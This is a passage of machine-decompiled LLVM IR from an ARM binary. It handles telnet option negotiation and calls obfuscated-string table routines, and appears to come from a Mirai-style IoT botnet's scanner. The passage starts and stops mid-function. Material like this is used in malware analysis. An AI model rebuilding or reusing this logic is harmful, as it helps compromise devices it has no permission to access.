  store i1 %v7_11400, i1* %cpsr_z.global-to-local, align 1
  %v1_11404 = add i32 %v0_11404, -1
  store i32 %v1_11404, i32* %r3.global-to-local, align 4
  br i1 %v7_11400, label %dec_label_pc_115dc, label %dec_label_pc_1140c

dec_label_pc_1140c:                               ; preds = %dec_label_pc_1140c.preheader, %dec_label_pc_11400
  %v0_11404 = phi i32 [ %v2_113dc, %dec_label_pc_1140c.preheader ], [ %v1_11404, %dec_label_pc_11400 ]
  %v0_1140c = phi i32 [ %v1_113ac, %dec_label_pc_1140c.preheader ], [ %v1_1140c, %dec_label_pc_11400 ]
  %v1_1140c = add i32 %v0_1140c, -1
  store i32 %v1_1140c, i32* %r0.global-to-local, align 4
  %v2_1140c = icmp ne i32 %v0_1140c, 0
  store i1 %v2_1140c, i1* %cpsr_c.global-to-local, align 1
  %v7_1140c = icmp eq i32 %v0_1140c, 1
  store i1 %v7_1140c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1140c, label %dec_label_pc_11414, label %dec_label_pc_113e8

dec_label_pc_11414:                               ; preds = %dec_label_pc_1140c, %dec_label_pc_113a8
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_11418 = call i32 @table_unlock_val(i32 31)
  store i32 %v2_11354, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_11428 = call i32 @table_retrieve_val(i32 31, i32* %v2_1135c)
  %v3_1142c = load i8, i8* %stack_var_-56, align 1
  %v4_1142c = sext i8 %v3_1142c to i32
  store i32 %v3_11428, i32* %r2.global-to-local, align 4
  %v1_11434 = add nsw i32 %v4_1142c, -1
  store i32 %v1_11434, i32* %r3.global-to-local, align 4
  %v0_11438 = load i32, i32* @sl, align 4
  store i32 %v0_11438, i32* %r0.global-to-local, align 4
  %v0_1143c = load i32, i32* @r5, align 4
  %v1_1143c = add i32 %v0_1143c, 24
  %v2_1143c = inttoptr i32 %v1_1143c to i32*
  %v3_1143c = load i32, i32* %v2_1143c, align 4
  store i32 %v3_1143c, i32* %r1.global-to-local, align 4
  %v4_11440 = call i32 @util_memsearch(i32 %v0_11438, i32 %v3_1143c, i32 %v3_11428, i32 %v1_11434)
  store i32 %v4_11440, i32* %r0.global-to-local, align 4
  %v1_11444 = add i32 %v4_11440, 1
  store i32 %v1_11444, i32* @r7, align 4
  %v2_11444 = icmp eq i32 %v4_11440, -1
  store i1 %v2_11444, i1* %cpsr_c.global-to-local, align 1
  %v7_11444 = icmp eq i32 %v1_11444, 0
  store i1 %v7_11444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11444, label %thread-pre-split103, label %bb415

bb415:                                            ; preds = %dec_label_pc_11414
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split103

thread-pre-split103:                              ; preds = %dec_label_pc_11414, %bb415
  %v0_1144c = phi i1 [ false, %bb415 ], [ true, %dec_label_pc_11414 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_1144c, i1* %cpsr_z.global-to-local, align 1
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_11850 = call i32 @table_lock_val(i32 31)
  store i32 %v1_11850, i32* %r0.global-to-local, align 4
  %v0_11854 = load i32, i32* @r5, align 4
  br i1 %v0_1144c, label %dec_label_pc_1184c, label %dec_label_pc_1145c

dec_label_pc_1145c:                               ; preds = %thread-pre-split103, %dec_label_pc_115dc
  %v0_1145c = phi i32 [ %v0_10d44, %dec_label_pc_115dc ], [ %v0_11854, %thread-pre-split103 ]
  %v1_1145c = inttoptr i32 %v0_1145c to i32*
  %v2_1145c = load i32, i32* %v1_1145c, align 4
  store i32 %v2_1145c, i32* %r3.global-to-local, align 4
  %v1_11460 = add i32 %v0_1145c, 4
  %v2_11460 = inttoptr i32 %v1_11460 to i32*
  %v3_11460 = load i32, i32* %v2_11460, align 4
  store i32 %v3_11460, i32* %r0.global-to-local, align 4
  %v1_11464 = add i32 %v2_1145c, 13
  %v2_11464 = inttoptr i32 %v1_11464 to i8*
  %v3_11464 = load i8, i8* %v2_11464, align 1
  %v4_11464 = zext i8 %v3_11464 to i32
  store i32 %v4_11464, i32* %r2.global-to-local, align 4
  %v1_11468 = add i32 %v2_1145c, 4
  %v2_11468 = inttoptr i32 %v1_11468 to i32*
  %v3_11468 = load i32, i32* %v2_11468, align 4
  store i32 %v3_11468, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11470 = call i32 @__libc_send(i32 %v3_11460, i32 %v3_11468, i32 %v4_11464, i32 16384)
  store i32 %v4_11470, i32* %r0.global-to-local, align 4
  %v0_11474 = load i32, i32* @r5, align 4
  %v1_11474 = add i32 %v0_11474, 4
  %v2_11474 = inttoptr i32 %v1_11474 to i32*
  %v3_11474 = load i32, i32* %v2_11474, align 4
  store i32 %v3_11474, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11484 = call i32 @__libc_send(i32 %v3_11474, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_1148c = load i32, i32* @r5, align 4
  %v2_1148c = add i32 %v1_1148c, 12
  %v3_1148c = inttoptr i32 %v2_1148c to i32*
  store i32 5, i32* %v3_1148c, align 4
  br label %dec_label_pc_11490

dec_label_pc_11490:                               ; preds = %dec_label_pc_1155c, %bb419, %dec_label_pc_1138c, %dec_label_pc_1166c, %dec_label_pc_115e8, %dec_label_pc_116b0, %dec_label_pc_1145c
  %v0_11490 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11490 = icmp eq i32 %v0_11490, 0
  store i1 %v2_11490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11490, label %dec_label_pc_10cc4.loopexit, label %dec_label_pc_10e64

dec_label_pc_1149c:                               ; preds = %dec_label_pc_10d44
  %v1_1149c = add i32 %v0_10d44, 24
  %v2_1149c = inttoptr i32 %v1_1149c to i32*
  %v3_1149c = load i32, i32* %v2_1149c, align 4
  store i32 %v3_1149c, i32* %r2.global-to-local, align 4
  %v0_114a0 = load i32, i32* @sl, align 4
  store i32 %v0_114a0, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_114a8146 = icmp eq i32 %v3_1149c, 0
  store i1 %v3_114a8146, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_114a8146, i1* %cpsr_z.global-to-local, align 1
  %v6_114ac153 = icmp sgt i32 %v3_1149c, 0
  br i1 %v6_114ac153, label %dec_label_pc_114b0.preheader, label %dec_label_pc_1155c

dec_label_pc_114a8.loopexit:                      ; preds = %dec_label_pc_114cc
  %v2_114d4 = add i32 %v1_114d4, 2
  store i32 %v2_114d4, i32* @r4, align 4
  %v2_114d8 = add i32 %v1_114d8, 2
  store i32 %v2_114d8, i32* @r7, align 4
  %v3_114a8 = icmp uge i32 %v2_114d8, %v1_114a8
  store i1 %v3_114a8, i1* %cpsr_c.global-to-local, align 1
  %v9_114a8 = icmp eq i32 %v2_114d8, %v1_114a8
  store i1 %v9_114a8, i1* %cpsr_z.global-to-local, align 1
  %v6_114ac = icmp slt i32 %v2_114d8, %v1_114a8
  br i1 %v6_114ac, label %dec_label_pc_114b0.preheader, label %dec_label_pc_1155c

dec_label_pc_114b0.preheader:                     ; preds = %dec_label_pc_1149c, %dec_label_pc_114a8.loopexit
  %v6_11564239 = phi i32 [ %v6_11564240, %dec_label_pc_114a8.loopexit ], [ %v0_10d44, %dec_label_pc_1149c ]
  %v1_114d8222 = phi i32 [ %v2_114d8, %dec_label_pc_114a8.loopexit ], [ 0, %dec_label_pc_1149c ]
  %v1_114bc220 = phi i32 [ %v1_114a8, %dec_label_pc_114a8.loopexit ], [ %v3_1149c, %dec_label_pc_1149c ]
  %v0_114b0218 = phi i32 [ %v2_114d4, %dec_label_pc_114a8.loopexit ], [ %v0_114a0, %dec_label_pc_1149c ]
  br label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %dec_label_pc_114b0.preheader, %dec_label_pc_11540
  %v6_11564240 = phi i32 [ %v6_11564239, %dec_label_pc_114b0.preheader ], [ %v0_11548, %dec_label_pc_11540 ]
  %v1_114d8 = phi i32 [ %v1_114d8222, %dec_label_pc_114b0.preheader ], [ %v1_1154c, %dec_label_pc_11540 ]
  %v1_114a8 = phi i32 [ %v1_114bc220, %dec_label_pc_114b0.preheader ], [ %v3_11548, %dec_label_pc_11540 ]
  %v1_114d4 = phi i32 [ %v0_114b0218, %dec_label_pc_114b0.preheader ], [ %v1_11554, %dec_label_pc_11540 ]
  %v1_114b0 = inttoptr i32 %v1_114d4 to i8*
  %v2_114b0 = load i8, i8* %v1_114b0, align 1
  %v3_114b0 = zext i8 %v2_114b0 to i32
  store i32 %v3_114b0, i32* @r3, align 4
  %v2_114b4 = icmp eq i8 %v2_114b0, -1
  store i1 %v2_114b4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_114b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114b4, label %dec_label_pc_114bc, label %dec_label_pc_1155c

dec_label_pc_114bc:                               ; preds = %dec_label_pc_114b0
  %v0_114bc = load i32, i32* @sl, align 4
  %v2_114bc = add i32 %v0_114bc, %v1_114a8
  store i32 %v2_114bc, i32* %r1.global-to-local, align 4
  %v1_114c0 = add i32 %v1_114d4, 1
  store i32 %v1_114c0, i32* @r6, align 4
  %v3_114c4 = icmp uge i32 %v2_114bc, %v1_114c0
  store i1 %v3_114c4, i1* %cpsr_c.global-to-local, align 1
  %v9_114c4 = icmp eq i32 %v2_114bc, %v1_114c0
  store i1 %v9_114c4, i1* %cpsr_z.global-to-local, align 1
  %v2_114c8 = xor i1 %v3_114c4, true
  %v3_114c8 = or i1 %v9_114c4, %v2_114c8
  br i1 %v3_114c8, label %dec_label_pc_1155c, label %dec_label_pc_114cc

dec_label_pc_114cc:                               ; preds = %dec_label_pc_114bc
  %v2_114cc = inttoptr i32 %v1_114c0 to i8*
  %v3_114cc = load i8, i8* %v2_114cc, align 1
  %v4_114cc = zext i8 %v3_114cc to i32
  store i32 %v4_114cc, i32* @r3, align 4
  %v2_114d0 = icmp eq i8 %v3_114cc, -1
  store i1 %v2_114d0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_114d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114d0, label %dec_label_pc_114a8.loopexit, label %dec_label_pc_114e0

dec_label_pc_114e0:                               ; preds = %dec_label_pc_114cc
  %v2_114e0 = icmp ugt i8 %v3_114cc, -4
  store i1 %v2_114e0, i1* %cpsr_c.global-to-local, align 1
  %v7_114e0 = icmp eq i8 %v3_114cc, -3
  store i1 %v7_114e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114e0, label %dec_label_pc_1156c, label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114e0
  %v1_114e8 = add i32 %v1_114d4, 2
  store i32 %v1_114e8, i32* @r3, align 4
  %v3_114ec = icmp uge i32 %v2_114bc, %v1_114e8
  store i1 %v3_114ec, i1* %cpsr_c.global-to-local, align 1
  %v9_114ec = icmp eq i32 %v2_114bc, %v1_114e8
  store i1 %v9_114ec, i1* %cpsr_z.global-to-local, align 1
  %v2_114f0 = xor i1 %v3_114ec, true
  %v3_114f0 = or i1 %v9_114ec, %v2_114f0
  br i1 %v3_114f0, label %dec_label_pc_1155c, label %dec_label_pc_114f4

dec_label_pc_114f4:                               ; preds = %dec_label_pc_115cc, %bb420, %.thread115, %dec_label_pc_114e8
  %v0_114f4 = load i32, i32* @r6, align 4
  %v1_114f4 = inttoptr i32 %v0_114f4 to i8*
  %v2_114f4 = load i8, i8* %v1_114f4, align 1
  %v3_114f4 = zext i8 %v2_114f4 to i32
  store i32 %v3_114f4, i32* %r3.global-to-local, align 4
  %v2_114f8 = icmp ugt i8 %v2_114f4, -4
  store i1 %v2_114f8, i1* %cpsr_c.global-to-local, align 1
  %v7_114f8 = icmp eq i8 %v2_114f4, -3
  store i1 %v7_114f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114f8, label %.thread107, label %dec_label_pc_11508

.thread107:                                       ; preds = %dec_label_pc_114f4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_114f4, align 1
  %v0_11504.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11504.pr.pr, label %.thread110, label %.thread107.dec_label_pc_11508thread-pre-split_crit_edge

.thread107.dec_label_pc_11508thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_11508.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_114f4, %.thread107.dec_label_pc_11508thread-pre-split_crit_edge
  %v0_11508.pr = phi i32 [ %v0_11508.pr.pre, %.thread107.dec_label_pc_11508thread-pre-split_crit_edge ], [ %v3_114f4, %dec_label_pc_114f4 ]
  %v2_11508 = icmp ugt i32 %v0_11508.pr, 250
  store i1 %v2_11508, i1* %cpsr_c.global-to-local, align 1
  %v7_11508 = icmp eq i32 %v0_11508.pr, 251
  store i1 %v7_11508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11508, label %bb416, label %.thread110

bb416:                                            ; preds = %dec_label_pc_11508
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11510 = load i32, i32* @r6, align 4
  %v4_11510 = inttoptr i32 %v3_11510 to i8*
  store i8 -3, i8* %v4_11510, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_11508, %.thread107, %bb416
  %v0_11514 = load i32, i32* @r4, align 4
  %v1_11514 = add i32 %v0_11514, 2
  %v2_11514 = inttoptr i32 %v1_11514 to i8*
  %v3_11514 = load i8, i8* %v2_11514, align 1
  %v4_11514 = zext i8 %v3_11514 to i32
  store i32 %v4_11514, i32* %r3.global-to-local, align 4
  %v2_11518 = icmp ugt i8 %v3_11514, -4
  store i1 %v2_11518, i1* %cpsr_c.global-to-local, align 1
  %v7_11518 = icmp eq i8 %v3_11514, -3
  store i1 %v7_11518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11518, label %.thread111, label %dec_label_pc_11528

.thread111:                                       ; preds = %.thread110
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_11514, align 1
  %v0_11524.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11524.pr.pr, label %.thread114, label %.thread111.dec_label_pc_11528thread-pre-split_crit_edge

.thread111.dec_label_pc_11528thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_11528.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11528

dec_label_pc_11528:                               ; preds = %.thread110, %.thread111.dec_label_pc_11528thread-pre-split_crit_edge
  %v0_11528.pr = phi i32 [ %v0_11528.pr.pre, %.thread111.dec_label_pc_11528thread-pre-split_crit_edge ], [ %v4_11514, %.thread110 ]
  %v2_11528 = icmp ugt i32 %v0_11528.pr, 250
  store i1 %v2_11528, i1* %cpsr_c.global-to-local, align 1
  %v7_11528 = icmp eq i32 %v0_11528.pr, 251
  store i1 %v7_11528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11528, label %bb417, label %.thread114

bb417:                                            ; preds = %dec_label_pc_11528
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11530 = load i32, i32* @r4, align 4
  %v4_11530 = add i32 %v3_11530, 2
  %v5_11530 = inttoptr i32 %v4_11530 to i8*
  store i8 -3, i8* %v5_11530, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_11528, %.thread111, %bb417
  %v0_11534 = load i32, i32* @r5, align 4
  %v1_11534 = add i32 %v0_11534, 4
  %v2_11534 = inttoptr i32 %v1_11534 to i32*
  %v3_11534 = load i32, i32* %v2_11534, align 4
  store i32 %v3_11534, i32* %r0.global-to-local, align 4
  %v0_11538 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_116c8, %.thread114
  %v0_11544 = phi i32 [ %v3_116e0, %dec_label_pc_116c8 ], [ %v3_11534, %.thread114 ]
  %storemerge4 = phi i32 [ %v2_1158c, %dec_label_pc_116c8 ], [ %v0_11538, %.thread114 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_116c8 ], [ 3, %.thread114 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11544 = call i32 @__libc_send(i32 %v0_11544, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_11544, i32* %r0.global-to-local, align 4
  %v0_11548 = load i32, i32* @r5, align 4
  %v1_11548 = add i32 %v0_11548, 24
  %v2_11548 = inttoptr i32 %v1_11548 to i32*
  %v3_11548 = load i32, i32* %v2_11548, align 4
  store i32 %v3_11548, i32* %r2.global-to-local, align 4
  %v0_1154c = load i32, i32* @r7, align 4
  %v1_1154c = add i32 %v0_1154c, 3
  store i32 %v1_1154c, i32* @r7, align 4
  %v3_11550 = icmp uge i32 %v1_1154c, %v3_11548
  store i1 %v3_11550, i1* %cpsr_c.global-to-local, align 1
  %v9_11550 = icmp eq i32 %v1_1154c, %v3_11548
  store i1 %v9_11550, i1* %cpsr_z.global-to-local, align 1
  %v0_11554 = load i32, i32* @r4, align 4
  %v1_11554 = add i32 %v0_11554, 3
  store i32 %v1_11554, i32* @r4, align 4
  %v5_11558 = icmp slt i32 %v1_1154c, %v3_11548
  br i1 %v5_11558, label %dec_label_pc_114b0, label %dec_label_pc_1155c

dec_label_pc_1155c:                               ; preds = %dec_label_pc_114a8.loopexit, %dec_label_pc_114b0, %dec_label_pc_11540, %dec_label_pc_114e8, %dec_label_pc_114bc, %dec_label_pc_1149c, %dec_label_pc_1156c.dec_label_pc_1155c.loopexit_crit_edge
  %v6_11564 = phi i32 [ %v0_11598, %dec_label_pc_1156c.dec_label_pc_1155c.loopexit_crit_edge ], [ %v0_10d44, %dec_label_pc_1149c ], [ %v6_11564240, %dec_label_pc_114b0 ], [ %v0_11548, %dec_label_pc_11540 ], [ %v6_11564240, %dec_label_pc_114e8 ], [ %v6_11564240, %dec_label_pc_114bc ], [ %v6_11564240, %dec_label_pc_114a8.loopexit ]
  %v0_1155c = phi i32 [ %v0_1155c.pre.pre, %dec_label_pc_1156c.dec_label_pc_1155c.loopexit_crit_edge ], [ 0, %dec_label_pc_1149c ], [ %v1_114d8, %dec_label_pc_114b0 ], [ %v1_1154c, %dec_label_pc_11540 ], [ %v1_114d8, %dec_label_pc_114e8 ], [ %v1_114d8, %dec_label_pc_114bc ], [ %v2_114d8, %dec_label_pc_114a8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1155c = icmp eq i32 %v0_1155c, 0
  store i1 %v2_1155c, i1* %cpsr_z.global-to-local, align 1
  %tmp418 = icmp slt i32 %v0_1155c, 1
  br i1 %tmp418, label %dec_label_pc_11490, label %bb419

bb419:                                            ; preds = %dec_label_pc_1155c
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_11564 = add i32 %v6_11564, 12
  %v8_11564 = inttoptr i32 %v7_11564 to i32*
  store i32 3, i32* %v8_11564, align 4
  br label %dec_label_pc_11490

dec_label_pc_1156c:                               ; preds = %dec_label_pc_114e0
  store i32 %v2_11570, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1b9d7.543 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_11570, i32* @r0, align 4
  %v0_11580 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_1158c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b9ce.545 to i32), i32* @r1, align 4
  %v0_11594 = call i32 @memcpy()
  store i32 %v0_11594, i32* %r0.global-to-local, align 4
  %v0_11598 = load i32, i32* @r5, align 4
  %v1_11598 = add i32 %v0_11598, 24
  %v2_11598 = inttoptr i32 %v1_11598 to i32*
  %v3_11598 = load i32, i32* %v2_11598, align 4
  %v0_1159c = load i32, i32* @r4, align 4
  %v1_1159c = add i32 %v0_1159c, 2
  store i32 %v1_1159c, i32* %r2.global-to-local, align 4
  %v0_115a0 = load i32, i32* @sl, align 4
  %v2_115a0 = add i32 %v0_115a0, %v3_11598
  store i32 %v2_115a0, i32* @r3, align 4
  %v3_115a4 = icmp uge i32 %v2_115a0, %v1_1159c
  store i1 %v3_115a4, i1* %cpsr_c.global-to-local, align 1
  %v9_115a4 = icmp eq i32 %v2_115a0, %v1_1159c
  store i1 %v9_115a4, i1* %cpsr_z.global-to-local, align 1
  %v2_115a8 = xor i1 %v3_115a4, true
  %v3_115a8 = or i1 %v9_115a4, %v2_115a8
  br i1 %v3_115a8, label %dec_label_pc_1156c.dec_label_pc_1155c.loopexit_crit_edge, label %dec_label_pc_115ac

dec_label_pc_1156c.dec_label_pc_1155c.loopexit_crit_edge: ; preds = %dec_label_pc_1156c
  %v0_1155c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1155c

dec_label_pc_115ac:                               ; preds = %dec_label_pc_1156c
  %v2_115ac = inttoptr i32 %v1_1159c to i8*
  %v3_115ac = load i8, i8* %v2_115ac, align 1
  %v4_115ac = zext i8 %v3_115ac to i32
  store i32 %v4_115ac, i32* %r3.global-to-local, align 4
  %v2_115b0 = icmp ugt i8 %v3_115ac, 30
  store i1 %v2_115b0, i1* %cpsr_c.global-to-local, align 1
  %v7_115b0 = icmp eq i8 %v3_115ac, 31
  store i1 %v7_115b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115b0, label %dec_label_pc_116c8, label %dec_label_pc_115b8

dec_label_pc_115b8:                               ; preds = %dec_label_pc_115ac
  %v1_115b8 = inttoptr i32 %v0_1159c to i8*
  %v2_115b8 = load i8, i8* %v1_115b8, align 1
  %v3_115b8 = zext i8 %v2_115b8 to i32
  store i32 %v3_115b8, i32* %r3.global-to-local, align 4
  %v2_115bc = icmp ugt i8 %v2_115b8, -4
  store i1 %v2_115bc, i1* %cpsr_c.global-to-local, align 1
  %v7_115bc = icmp eq i8 %v2_115b8, -3
  store i1 %v7_115bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115bc, label %.thread115, label %dec_label_pc_115cc

.thread115:                                       ; preds = %dec_label_pc_115b8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_115b8, align 1
  %v0_115c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_115c8.pr.pr, label %dec_label_pc_114f4, label %.thread115.dec_label_pc_115ccthread-pre-split_crit_edge

.thread115.dec_label_pc_115ccthread-pre-split_crit_edge: ; preds = %.thread115
  %v0_115cc.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_115cc

dec_label_pc_115cc:                               ; preds = %dec_label_pc_115b8, %.thread115.dec_label_pc_115ccthread-pre-split_crit_edge
  %v0_115cc.pr = phi i32 [ %v0_115cc.pr.pre, %.thread115.dec_label_pc_115ccthread-pre-split_crit_edge ], [ %v3_115b8, %dec_label_pc_115b8 ]
  %v2_115cc = icmp ugt i32 %v0_115cc.pr, 250
  store i1 %v2_115cc, i1* %cpsr_c.global-to-local, align 1
  %v7_115cc = icmp eq i32 %v0_115cc.pr, 251
  store i1 %v7_115cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115cc, label %bb420, label %dec_label_pc_114f4

bb420:                                            ; preds = %dec_label_pc_115cc
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_115d4 = load i32, i32* @r4, align 4
  %v4_115d4 = inttoptr i32 %v3_115d4 to i8*
  store i8 -3, i8* %v4_115d4, align 1
  br label %dec_label_pc_114f4

dec_label_pc_115dc:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_11400, %dec_label_pc_113f8, %bb414, %dec_label_pc_113d4, %dec_label_pc_113b8, %dec_label_pc_113cc, %bb413
  %v0_115dc = phi i32 [ %v1_113ac, %dec_label_pc_113d4 ], [ %v1_113ac, %dec_label_pc_113b8 ], [ %v1_113ac, %dec_label_pc_113cc ], [ %v1_113ac, %bb413 ], [ %v1_1140c, %bb414 ], [ %v1_1140c, %dec_label_pc_113f8 ], [ %v1_1140c, %dec_label_pc_11400 ], [ %v1_1140c, %dec_label_pc_113e8 ]
  %v1_115dc = add i32 %v0_115dc, 1
  store i32 %v1_115dc, i32* @r7, align 4
  br label %dec_label_pc_1145c

dec_label_pc_115e4:                               ; preds = %dec_label_pc_112f8, %dec_label_pc_11318, %dec_label_pc_11310, %dec_label_pc_11308, %bb410, %dec_label_pc_112e4, %dec_label_pc_112c0, %dec_label_pc_112dc, %dec_label_pc_112d4, %bb409
  %v0_115e4 = phi i32 [ %v1_112b4, %dec_label_pc_112e4 ], [ %v1_112b4, %dec_label_pc_112c0 ], [ %v1_112b4, %dec_label_pc_112dc ], [ %v1_112b4, %dec_label_pc_112d4 ], [ %v1_112b4, %bb409 ], [ %v1_11324, %bb410 ], [ %v1_11324, %dec_label_pc_11308 ], [ %v1_11324, %dec_label_pc_11310 ], [ %v1_11324, %dec_label_pc_11318 ], [ %v1_11324, %dec_label_pc_112f8 ]
  %v1_115e4 = add i32 %v0_115e4, 1
  store i32 %v1_115e4, i32* @r7, align 4
  br label %dec_label_pc_115e8

dec_label_pc_115e8:                               ; preds = %dec_label_pc_1138c.dec_label_pc_115e8_crit_edge, %dec_label_pc_115e4
  %v0_115e8 = phi i32 [ %v0_115e8.pre, %dec_label_pc_1138c.dec_label_pc_115e8_crit_edge ], [ %v0_10d44, %dec_label_pc_115e4 ]
  %v1_115e8 = inttoptr i32 %v0_115e8 to i32*
  %v2_115e8 = load i32, i32* %v1_115e8, align 4
  store i32 %v2_115e8, i32* %r3.global-to-local, align 4
  %v1_115ec = add i32 %v0_115e8, 4
  %v2_115ec = inttoptr i32 %v1_115ec to i32*
  %v3_115ec = load i32, i32* %v2_115ec, align 4
  store i32 %v3_115ec, i32* %r0.global-to-local, align 4
  %v1_115f0 = add i32 %v2_115e8, 12
  %v2_115f0 = inttoptr i32 %v1_115f0 to i8*
  %v3_115f0 = load i8, i8* %v2_115f0, align 1
  %v4_115f0 = zext i8 %v3_115f0 to i32
  store i32 %v4_115f0, i32* %r2.global-to-local, align 4
  %v1_115f4 = inttoptr i32 %v2_115e8 to i32*
  %v2_115f4 = load i32, i32* %v1_115f4, align 4
  store i32 %v2_115f4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_115fc = call i32 @__libc_send(i32 %v3_115ec, i32 %v2_115f4, i32 %v4_115f0, i32 16384)
  store i32 %v4_115fc, i32* %r0.global-to-local, align 4
  %v0_11600 = load i32, i32* @r5, align 4
  %v1_11600 = add i32 %v0_11600, 4
  %v2_11600 = inttoptr i32 %v1_11600 to i32*
  %v3_11600 = load i32, i32* %v2_11600, align 4
  store i32 %v3_11600, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11610 = call i32 @__libc_send(i32 %v3_11600, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_11618 = load i32, i32* @r5, align 4
  %v2_11618 = add i32 %v1_11618, 12
  %v3_11618 = inttoptr i32 %v2_11618 to i32*
  store i32 4, i32* %v3_11618, align 4
  br label %dec_label_pc_11490

dec_label_pc_11620:                               ; preds = %dec_label_pc_10de8
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_1162c = call i32 @table_unlock_val(i32 29)
  store i32 %v2_11354, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_1163c = call i32 @table_retrieve_val(i32 29, i32* nonnull %v2_1135c)
  store i32 %v3_1163c, i32* %r0.global-to-local, align 4
  %v3_11640 = load i8, i8* %stack_var_-56, align 1
  %v4_11640 = sext i8 %v3_11640 to i32
  store i32 %v3_1163c, i32* %r2.global-to-local, align 4
  %v1_11648 = add nsw i32 %v4_11640, -1
  store i32 %v1_11648, i32* %r3.global-to-local, align 4
  %v0_1164c = load i32, i32* @r5, align 4
  %v1_1164c = add i32 %v0_1164c, 24
  %v2_1164c = inttoptr i32 %v1_1164c to i32*
  %v3_1164c = load i32, i32* %v2_1164c, align 4
  store i32 %v3_1164c, i32* %r1.global-to-local, align 4
  %v0_11650 = load i32, i32* @sl, align 4
  store i32 %v0_11650, i32* %r0.global-to-local, align 4
  %v4_11654 = call i32 @util_memsearch(i32 %v0_11650, i32 %v3_1164c, i32 %v3_1163c, i32 %v1_11648)
  store i32 %v4_11654, i32* @r7, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_11660 = call i32 @table_lock_val(i32 29)
  store i32 %v1_11660, i32* %r0.global-to-local, align 4
  %v0_11664 = load i32, i32* @r7, align 4
  %v2_11664 = icmp eq i32 %v0_11664, -1
  store i1 %v2_11664, i1* %cpsr_c.global-to-local, align 1
  %v7_11664 = icmp eq i32 %v0_11664, -1
  store i1 %v7_11664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11664, label %dec_label_pc_10cc4.loopexit, label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11620
